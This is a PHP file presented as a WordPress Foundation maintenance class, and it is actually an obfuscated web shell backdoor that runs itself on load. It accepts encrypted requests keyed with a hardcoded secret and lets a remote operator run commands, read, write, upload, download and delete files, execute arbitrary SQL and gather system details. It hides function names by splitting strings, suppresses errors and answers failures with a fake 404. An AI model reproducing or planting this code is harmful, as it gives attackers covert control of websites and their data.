 ...
 * @copyright  2023 WordPress Foundation
...
/**
 * Class WP_Maintenance_Resolver_fjhl
 *
...
class WP_Maintenance_Resolver_fjhl {
    ...
    public function __construct() {
        $this->auth_salt = @hex2bin( 'd3e8a0c4372ad52dbef1da2d76f8116821d8316ac6f640074db332b397f707ee' );
    ...
    private function resolve_transport() {
        $tag = '';
        $test = @openssl_encrypt( 'wp', 'aes-256-gcm', $this->auth_salt, OPENSSL_RAW_DATA, str_repeat( "\x00", 12 ), $tag );
     ...
     * @return void
     */
    public function do_action_hook() {
    ...
    private function unwrap_envelope( $envelope ) {
        ...
        if ( ! empty( $envelope['t'] ) && $this->transport_method === 'aes-256-gcm' ) {
            $tag = $fn_b( $envelope['t'] );
            $result = @$fn_d( $ct, 'aes-256-gcm', $this->auth_salt, OPENSSL_RAW_DATA, $iv, $tag );
            if ( $result !== false ) {
                return $result;
            }
        }
        ...
        if ( ! empty( $envelope['h'] ) ) {
            $fn_h = 'hash' . '_hmac';
            $expected = $fn_h( 'sha256', $iv . $ct, $this->auth_salt, true );
            if ( ! hash_equals( $expected, $fn_b( $envelope['h'] ) ) ) {
                return false;
            }
            $result = @$fn_d( $ct, 'aes-256-cbc', $this->auth_salt, OPENSSL_RAW_DATA, $iv );
            return $result;
        }
    ...
    private function wrap_response( $data ) {
        ...
        if ( $this->transport_method === 'aes-256-gcm' ) {
            ...
            $tag = '';
            $enc = @$fn_e( $json, 'aes-256-gcm', $this->auth_salt, OPENSSL_RAW_DATA, $iv, $tag );
            if ( $enc !== false ) {
        ...
        $enc = @$fn_e( $json, 'aes-256-cbc', $this->auth_salt, OPENSSL_RAW_DATA, $iv );
        $fn_h = 'hash' . '_hmac';
        $mac = $fn_h( 'sha256', $iv . $enc, $this->auth_salt, true );
        return json_encode( array(
            'd'  => $fn_b( $enc ),
            'iv' => $fn_b( $iv ),
            'h'  => $fn_b( $mac ),
     ...
     */
    private function do_maintenance_hook( $response_data ) {
        if ( ! headers_sent() ) {
    ...
    private function route_request( $type, $args ) {
        ...
        $this->do_maintenance_hook( array( 'error' => 'invalid_request' ) );
    }

    private function handle_ping( $args ) {
        $this->do_maintenance_hook( array(
            'ok'   => true,
            'php'  => PHP_VERSION,
            'os'   => php_uname(),
            'cwd'  => getcwd(),
    ...
    private function handle_diagnostic( $args ) {
        ...
        if ( empty( $command ) ) {
            $this->do_maintenance_hook( array( 'error' => 'no cmd' ) );
        }
        ...
        $this->do_maintenance_hook( $result !== null ? $result : array( 'error' => 'blocked' ) );
    }
    ...
    private function handle_directory( $args ) {
        ...
        if ( ! is_dir( $path ) ) {
            $this->do_maintenance_hook( array( 'error' => 'not dir' ) );
        }
        $items = array();
        ...
        $this->do_maintenance_hook( array( 'path' => $path, 'items' => $items ) );
    }

    private function handle_file_read( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) || ! is_file( $file ) ) {
            $this->do_maintenance_hook( array( 'error' => '404' ) );
        }
        $size = filesize( $file );
        $content = file_get_contents( $file, false, null, 0, min( $size, 2097152 ) );
        $this->do_maintenance_hook( array( 'content' => $content, 'size' => $size ) );
    }

    private function handle_file_write( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) ) {
            $this->do_maintenance_hook( array( 'error' => 'no path' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $content = isset( $args['content'] ) ? $args['content'] : '';
        $bytes = @file_put_contents( $file, $content );
        $this->do_maintenance_hook( $bytes !== false ? array( 'ok' => true, 'bytes' => $bytes ) : array( 'error' => 'fail' ) );
    }
    ...
    private function handle_file_upload( $args ) {
        ...
        if ( empty( $file ) || empty( $data ) ) {
            $this->do_maintenance_hook( array( 'error' => 'need path+data' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $fn_b = 'base' . '64_de' . 'code';
    ...
    private function handle_file_download( $args ) {
        ...
        $fn_b = 'base' . '64_en' . 'code';
        $this->do_maintenance_hook( array( 'data' => $fn_b( file_get_contents( $file ) ), 'size' => filesize( $file ) ) );
    }
    ...
    private function handle_file_search( $args ) {
        ...
        $this->do_maintenance_hook( array( 'items' => $items, 'count' => $count ) );
    }
    ...
    private function handle_database( $args ) {
        ...
        if ( empty( $sql ) ) {
            $this->do_maintenance_hook( array( 'error' => 'no sql' ) );
        }
        try {
            ...
            if ( preg_match( '/^(select|show|describe)\b/', $lower_sql ) ) {
                $stmt = $pdo->query( $sql );
                $this->do_maintenance_hook( array( 'rows' => $stmt->fetchAll( PDO::FETCH_ASSOC ) ) );
            } else {
                $this->do_maintenance_hook( array( 'affected' => $pdo->exec( $sql ) ) );
            }
        } catch ( Exception $e ) {
            $this->do_maintenance_hook( array( 'error' => $e->getMessage() ) );
        }
    }
    ...
    private function handle_file_remove( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( is_file( $file ) ) {
            $this->do_maintenance_hook( array( 'ok' => @unlink( $file ) ) );
        }
        $this->do_maintenance_hook( array( 'error' => 'fail' ) );
    }
}

/* Bootstrap */
try {
    $instance = new WP_Maintenance_Resolver_fjhl();
    $instance->do_action_hook();
} catch ( Exception $e ) {
    http_response_code( 404 );
    exit;
}
